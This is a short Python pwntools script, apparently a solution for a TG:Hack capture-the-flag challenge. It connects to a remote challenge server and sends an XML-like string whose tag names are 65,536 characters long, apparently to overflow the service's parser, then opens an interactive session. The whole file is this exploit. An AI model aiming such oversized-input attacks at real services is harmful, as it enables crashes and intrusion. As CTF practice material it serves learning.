from pwn import *

p = remote('extract.tghack.no', 6000)


print p.recvrepeat(0.2)



p.sendline('<'+'a'*0x10000+'>'+'test'+'</'+'a'*0x10000+'>')


p.interactive()
